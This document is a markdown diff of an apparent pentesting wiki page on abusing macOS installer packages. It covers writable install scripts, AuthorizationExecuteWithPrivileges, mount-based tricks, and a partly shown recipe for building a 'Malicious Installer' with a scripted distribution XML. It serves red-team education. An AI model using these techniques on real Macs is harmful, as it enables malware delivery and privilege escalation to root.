@@ -1,6 +1,5 @@
 # macOS Installers Abuse
 
-
 ## Pkg Basic Information
 
 A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.
@@ -9,8 +8,7 @@ The package file itself is an archive that holds a **hierarchy of files and dire
 
 ### Hierarchy
 
-![[../../../images/Pasted Graphic.png|https://www.youtube.com/watch?v=iASSG0_zobQ]]
-
+![https://www.youtube.com/watch?v=iASSG0_zobQ](../../../images/Pasted Graphic.png)
 
 - **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
 - **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
@@ -33,8 +31,8 @@ xar -xf "/path/to/package.pkg"
 cat Scripts | gzip -dc | cpio -i
 cpio -i < Scripts
 ```
-```
-In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [[https://mothersruin.com/software/SuspiciousPackage/|**Suspicious Package**]].
+
+In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).
 
 ## DMG Basic Information
 
@@ -45,8 +43,7 @@ DMG files, or Apple Disk Images, are a file format used by Apple's macOS for dis
 
 ### Hierarchy
 
-![[../../../images/image (225).png|]]
-
+![](../../../images/image (225).png)
 
 The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:
 
@@ -60,28 +57,27 @@ The hierarchy of a DMG file can be different based on the content. However, for 
 
 If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example:
 
-![[../../../images/Pasted Graphic 5.png|https://www.youtube.com/watch?v=iASSG0_zobQ]]
+![https://www.youtube.com/watch?v=iASSG0_zobQ](../../../images/Pasted Graphic 5.png)
 
-*[[https://www.youtube.com/watch?v=kCXhIYtODBg|https://www.youtube.com/watch?v\=kCXhIYtODBg]]*
-
+*[https://www.youtube.com/watch?v\=kCXhIYtODBg](https://www.youtube.com/watch?v=kCXhIYtODBg)*
 
 ### AuthorizationExecuteWithPrivileges
 
-This is a [[https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg|public function]] that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
+This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
 
 ```bash
 # Breakpoint in the function to check wich file is loaded
 (lldb) b AuthorizationExecuteWithPrivileges
 # You could also check FS events to find this missconfig
 ```
-```
-For more info check this talk: [[https://www.youtube.com/watch?v=lTOItyjTTkw|https://www.youtube.com/watch?v=lTOItyjTTkw]]
+
+For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)
 
 ### Execution by mounting
 
 If an installer writes to `/tmp/fixedname/bla/bla`, it's possible to **create a mount** over `/tmp/fixedname` with noowners so you could **modify any file during the installation** to abuse the installation process.
 
-An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look to the talk: [[https://www.youtube.com/watch?v=jSYPazD4VcE|**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**]]
+An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look to the talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
 
 ## pkg as malware
 
@@ -93,8 +89,7 @@ It's possible to just generate a **`.pkg`** file with **pre and post-install scr
 
 It's possible to add **`<script>`** tags in the **distribution xml** file of the package and that code will get executed and it can **execute commands** using **`system.run`**:
 
-![[../../../images/image (1043).png|]]
-
+![](../../../images/image (1043).png)
 
 ### Backdoored Installer
 
@@ -122,12 +117,8 @@ pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.maliciou
 cat > ./dist.xml <<EOF
 <?xml version="1.0" encoding="utf-8"?>
 <installer-gui-script minSpecVersion="1">
-    <!--
-title: Malicious Installer
--->
-
-Malicious Installer
-    
+    <title>Malicious Installer</title>
+    <options customize="allow" require-scripts="false"/>
     <script>
         <![CDATA[
         function installationCheck() {
@@ -151,26 +142,24 @@ Malicious Installer
     </script>
     <choices-outline>
         <line choice="default">
-            
+            <line choice="myapp"/>
         </line>
     </choices-outline>
     <choice id="myapp" title="MyApp">
-        
+        <pkg-ref id="com.malicious.myapp"/>
     </choice>
-    \#myapp.pkg
+    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
 </installer-gui-script>
 EOF
 
 # Buil final
 productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
 ```
-```
+
 ## References
 
-- [[https://www.youtube.com/watch?v=iASSG0_zobQ|**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**]]
-- [[https://www.youtube.com/watch?v=Eow5uNHtmIg|**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**]]
-- [[https://www.youtube.com/watch?v=kCXhIYtODBg|**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**]]
-- [[https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages|https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages]]
-
-
+- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
+- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
+- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
+- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
 
